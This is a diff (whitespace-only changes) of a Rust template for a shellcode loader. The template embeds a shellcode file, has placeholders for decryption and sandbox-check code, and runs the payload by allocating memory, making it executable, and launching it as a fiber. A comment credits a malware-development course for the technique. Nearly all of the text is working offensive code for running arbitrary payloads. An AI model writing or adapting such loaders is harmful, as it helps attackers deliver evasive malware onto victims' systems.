@@ -16,15 +16,15 @@ use std::include_bytes;
 {{DECRYPTION_FUNCTION}}
 
 fn enhance(buf: Vec<u8>) {
-    
+
     unsafe {
         // Execution method ported from Maldev Academy "Utilizing fibers for execution" module. Thanks Maldev !
-        
+
         let alloc = VirtualAlloc(null(), buf.len(), MEM_COMMIT, PAGE_READWRITE);
         let alloc_ptr: *mut u8 = alloc as *mut u8;
         std::ptr::copy_nonoverlapping(buf.as_ptr(), alloc_ptr, buf.len());
         let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READWRITE;
-        
+
         VirtualProtect(alloc, buf.len(), PAGE_EXECUTE_READWRITE, &mut old_perms);
 
         let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(alloc_ptr);
@@ -64,14 +64,14 @@ fn enhance(buf: Vec<u8>) {
 
 fn main() {
     {{SANDBOX}}
-    
+
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
 
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
         vec.push(*i);
     }
-    
+
     {{MAIN}}
 
     enhance(vec.clone());
